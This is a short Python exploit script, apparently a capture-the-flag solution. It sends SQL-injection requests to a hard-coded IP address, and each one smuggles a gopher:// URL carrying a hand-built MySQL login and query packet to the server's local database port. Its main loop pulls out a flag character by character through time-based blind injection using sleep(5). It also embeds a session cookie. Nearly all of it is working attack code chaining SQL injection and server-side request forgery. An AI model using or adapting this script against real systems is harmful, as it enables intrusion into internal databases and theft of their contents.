#!/bin/bash
import struct 
import binascii
from binascii import hexlify
import requests
import time

cookies = {
    'PHPSESSID': '5icps1lfga9oqrsr5enundodv6',
}

auth = bytearray([0xb6, 0x0, 0x0,0x1,0x05, 0xa2, 0x3f, 0x00,0x00,0x00,0x00,0x01,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00] 
    + list(b'fl4g_m4n4g3r') + [0x00,0x00,0x6d,0x79,0x73,0x71,0x6c,0x5f,0x6e,0x61,0x74,0x69,0x76,0x65,0x5f,0x70,0x61,0x73,0x73,0x77,0x6f,0x72,0x64,0x00,0x71,0x03,0x5f,0x6f,0x73,0x10,0x64,0x65,0x62,0x69,0x61,0x6e,0x2d,0x6c,0x69,0x6e,0x75,0x78,0x2d,0x67,0x6e,0x75,0x0c,0x5f,0x63,0x6c,0x69,0x65,0x6e,0x74,0x5f,0x6e,0x61,0x6d,0x65,0x08,0x6c,0x69,0x62,0x6d,0x79,0x73,0x71,0x6c,0x04,0x5f,0x70,0x69,0x64,0x05,0x31,0x30,0x37,0x30,0x35,0x0f,0x5f,0x63,0x6c,0x69,0x65,0x6e,0x74,0x5f,0x76,0x65,0x72,0x73,0x69,0x6f,0x6e,0x06,0x35,0x2e,0x36,0x2e,0x33,0x30,0x09,0x5f,0x70,0x6c,0x61,0x74,0x66,0x6f,0x72,0x6d,0x06,0x78,0x38,0x36,0x5f,0x36,0x34,0x0c,0x70,0x72,0x6f,0x67,0x72,0x61,0x6d,0x5f,0x6e,0x61,0x6d,0x65,0x05,0x6d,0x79,0x73,0x71,0x6c])

def encode(s):
    return ''.join(map(lambda x: "%{:02x}".format(x), list(s)))

flag = ""
while True:
    for i in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_!":
        cmd_arr = list(b"select flag from flag.flag where flag like '"+flag+i+"%' and sleep(5)")
        res = len(cmd_arr)+1
        cmd = struct.pack("<b", res) + bytearray([ 0x0, 0x0, 0x0, 0x03] + cmd_arr )
        quit_packet = bytearray([0x1, 0x0, 0x0, 0x0, 0x1])
        ddd = b"gopher://localhost:3306/A" + bytes(encode(auth + cmd + quit_packet))
        payload = "0x"+binascii.b2a_hex(ddd)
        t1 = time.time()
        url = "http://128.199.179.156/info.php?uid=%1$c%20and%201=2%20union%20select%201,2,"+payload+"%20--%20-"
        response = requests.get(url, cookies=cookies)
        t2 = time.time()
        if (t2 - t1) > 4.30:
            flag += i
            break
        print "time : "+str(t2 - t1)
        
    print flag